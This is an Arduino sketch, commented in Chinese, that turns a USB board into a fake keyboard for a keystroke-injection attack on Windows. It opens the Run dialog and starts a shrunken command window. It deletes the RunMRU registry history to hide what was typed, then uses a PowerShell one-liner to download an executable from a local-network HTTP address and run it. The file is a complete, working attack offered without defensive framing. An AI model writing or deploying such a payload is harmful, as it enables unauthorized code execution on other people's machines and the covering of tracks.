#include<Keyboard.h> //包含键盘模块头文件
void setup() {
  // put your setup code here, to run once:
  Keyboard.begin();//开始键盘通信
  delay(1000);//延时1000毫秒，不要太短，因为每天电脑的运行速度都不一样
  //Keyboard.press(KEY_CAPS_LOCK); //按下大写键 这里我们最好这样写 不然大多数电脑在中文输入的情况下就会出现问题
  //Keyboard.release(KEY_CAPS_LOCK); //释放大写键
  delay(200);
  Keyboard.press(KEY_LEFT_GUI);//按下徽标键 也就是win键
  delay(200);
  Keyboard.press('r');//按下r键
  delay(200);
  Keyboard.release(KEY_LEFT_GUI);//松掉win键
  Keyboard.release('r');//松掉r键
  delay(200);
  Keyboard.println("cmd.exe /T:01 /K mode CON: COLS=16 LINES=1");//输入cmd进入DOS
  delay(200);
  Keyboard.press(KEY_RETURN);  //按下回车键
  Keyboard.release(KEY_RETURN); //释放回车键
  delay(200);
  Keyboard.println("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f");
  delay(500);
  //cmd.exe
  //Keyboard.press(KEY_RETURN);  //按下回车键
  //Keyboard.release(KEY_RETURN); //释放回车键
  delay(500);
  Keyboard.println("powershell -Command $clnt = new-object System.Net.WebClient;$url= 'http://192.168.0.20/0-20_64.exe';$file = ' e:\\x.exe ';$clnt.DownloadFile($url,$file);"); 
  Keyboard.press(KEY_RETURN);  //按下回车键
  Keyboard.release(KEY_RETURN); //释放回车键
  delay(2000);
  Keyboard.println("e:\\x.exe&exit");
  delay(500);
  Keyboard.press(KEY_RETURN);  //按下回车键
  Keyboard.release(KEY_RETURN); //释放回车键
  delay(300);
 // Keyboard.press(KEY_CAPS_LOCK); //按下大写键
  //Keyboard.release(KEY_CAPS_LOCK); //释放大写键 我们再次关闭开启的大写键
  delay(300);
  Keyboard.end();//结束键盘通讯
}

void loop() {
  // put your main code here, to run repeatedly:
}